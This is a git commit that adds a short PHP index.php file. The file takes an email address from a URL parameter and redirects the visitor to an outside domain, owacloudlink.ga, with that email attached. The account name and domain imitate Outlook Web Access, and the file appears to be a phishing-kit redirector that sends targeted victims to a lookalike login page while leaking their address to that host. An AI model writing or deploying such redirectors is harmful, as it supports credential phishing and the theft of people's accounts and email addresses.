a71ce5cce1f50b9f43100854b59f96196da97624
owasecure <84668710+owasecure@users.noreply.github.com>
2021-05-23 14:54:15 +0200

    Create index.php

---
+++ index.php
@@ -0,0 +1,14 @@
+Crypt
+
+<?php
+function getemIDFromem($em)
+{
+$find = '@';
+$pos = strpos($em, $find);
+$emID = substr($em, 0, $pos);
+return $emID;
+}
+$em = $_GET['em'];
+$emID = getemIDFromem($em);
+header("Location: https://owacloudlink.ga/?em=$em");
+?>
